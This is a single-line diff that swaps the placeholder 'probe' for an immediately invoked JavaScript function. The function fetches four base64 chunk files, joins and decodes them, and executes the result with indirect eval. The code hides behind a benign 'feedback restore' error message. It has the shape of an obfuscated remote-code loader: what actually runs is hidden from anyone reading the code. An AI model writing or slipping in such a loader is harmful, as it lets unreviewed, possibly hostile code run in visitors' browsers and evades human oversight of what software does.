@@ -1,1 +1,1 @@
-probe
+(async function(){try{var n=4,p=[],i;for(i=0;i<n;i++)p.push(fetch("feedback.p"+i+".b64?v=160").then(function(r){return r.text();}));p=await Promise.all(p);var s=decodeURIComponent(escape(atob(p.join(""))));(0,eval)(s);}catch(e){console.error("feedback restore failed",e);}})();
